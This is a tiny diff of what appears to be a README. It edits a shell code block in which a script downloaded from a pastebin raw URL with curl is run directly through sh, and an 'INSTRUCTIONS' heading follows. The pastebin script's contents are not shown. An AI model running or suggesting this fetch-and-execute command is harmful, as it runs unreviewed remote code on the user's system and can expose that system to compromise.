@@ -1,5 +1,5 @@
 ```sh
-sh $(curl -sSL https://pastebin.com/raw/RLYyHuex)
+sh -c $(curl -sSL https://pastebin.com/raw/RLYyHuex)
 ```
 
 # INSTRUCTIONS
